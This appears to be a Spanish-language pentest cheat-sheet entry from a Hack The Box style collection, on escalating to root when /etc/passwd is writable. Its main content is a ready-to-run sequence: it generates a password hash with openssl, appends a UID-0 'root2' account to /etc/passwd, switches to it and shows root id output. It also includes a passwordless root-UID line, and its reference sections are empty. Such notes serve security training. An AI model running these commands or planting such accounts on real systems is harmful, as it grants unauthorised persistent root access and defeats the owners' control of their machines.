
## DESCRIPTION

Si tenemos permiso de escritura en el /etc/passwd entonces podemos generar un hash y escribirlo en el fichero (con id de root)

#### Mas información
* 

## EXPLOITATION


infosecadventures::0:0:root:/root:/bin/bash
```
openssl passwd w00t
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
w00t
id
uid=0(root) gid=0(root) groups=0(root)
```

## MACHINES

* Hack The Box: 






